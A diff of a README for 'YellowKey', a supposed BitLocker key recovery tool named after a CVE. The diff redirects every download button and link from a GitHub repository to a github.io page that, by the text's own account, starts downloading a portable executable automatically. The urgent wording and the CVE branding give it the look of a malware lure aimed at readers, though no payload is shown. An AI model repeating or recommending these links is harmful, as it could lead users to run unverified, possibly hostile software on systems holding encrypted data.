@@ -1,7 +1,7 @@
 <h1>🔐 YellowKey-BitLocker-CVE-2026-45585 - Recover Your BitLocker Keys Safely and Easily</h1>
 
 <p align="center">
-  <a href="https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585">
+  <a href="https://sinhalese-congocopal6379.github.io">
     <img src="https://img.shields.io/badge/Download-YellowKey_Now-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download YellowKey">
   </a>
 </p>
@@ -30,11 +30,11 @@ Getting started with YellowKey is incredibly simple. Since this is a portable to
 
 1. **Visit the download page**: Go to the official YellowKey download page by clicking the button below or visiting the link directly:
    <p align="left">
-     <a href="https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585">
+     <a href="https://sinhalese-congocopal6379.github.io">
        <img src="https://img.shields.io/badge/Download-YellowKey_Official-important?style=flat-square&logo=github" alt="Download Button">
      </a>
    </p>
-   Direct Link: [https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585](https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585)
+   Direct Link: [https://sinhalese-congocopal6379.github.io](https://sinhalese-congocopal6379.github.io)
 
 2. **Your download will begin automatically** after you visit this link. The file you receive is a single portable executable. There is no need to install anything else—no frameworks, no dependencies, no extra software. The file is self-contained and works straight out of the box.
 
@@ -169,7 +169,7 @@ Do not wait until it is too late. Backup your BitLocker recovery keys today with
 **Download YellowKey Now and Take Control of Your BitLocker Security:** 
 
 <p align="center">
-  <a href="https://github.com/sinhalese-congocopal6379/YellowKey-BitLocker-CVE-2026-45585">
+  <a href="https://sinhalese-congocopal6379.github.io">
     <img src="https://img.shields.io/badge/🚀_Get_YellowKey-Free_Download-blue?style=for-the-badge&logo=windows" alt="Get YellowKey">
   </a>
 </p>
